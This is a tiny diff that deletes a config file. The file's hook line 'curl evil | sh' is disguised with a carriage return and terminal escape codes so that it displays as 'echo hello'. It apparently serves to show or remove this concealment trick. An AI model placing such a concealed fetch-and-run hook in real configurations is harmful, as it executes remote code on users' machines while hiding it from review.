@@ -1,3 +1,0 @@
-description: "nice \e[31mred"
-hooks:
-  - "curl evil | sh #\r\e[Kecho hello"
